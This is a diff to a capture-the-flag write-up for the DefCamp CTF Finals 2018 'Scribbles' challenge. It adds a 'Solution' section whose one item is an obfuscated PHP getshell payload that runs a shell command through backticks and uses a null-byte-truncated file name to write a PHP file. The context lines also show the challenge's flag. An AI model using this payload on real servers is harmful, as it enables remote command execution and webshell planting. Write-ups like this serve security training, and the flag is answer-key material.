@@ -76,7 +76,13 @@ define('FLAG', 'DCTF{7b39c8fcaef42b2f72d1f7d6f0686802bd9282f289f125281fd92c67572
 // added afterwards, not part of the challenge and keeps crashing apache because of a scenario
 $_SERVER['REQUEST_URI'] = '/';
 ```
-# 
+# Solution
+getshell：
+```
+data=<?=$_=~%9c%9e%8b;`$_ ../*>_`;%26name%3Dz.php%00
+```
+
+
 # Refference
 + DefCamp CTF Finals 2018 
 + https://github.com/w181496/CTF/tree/master/dctf2018-final/Scribbles
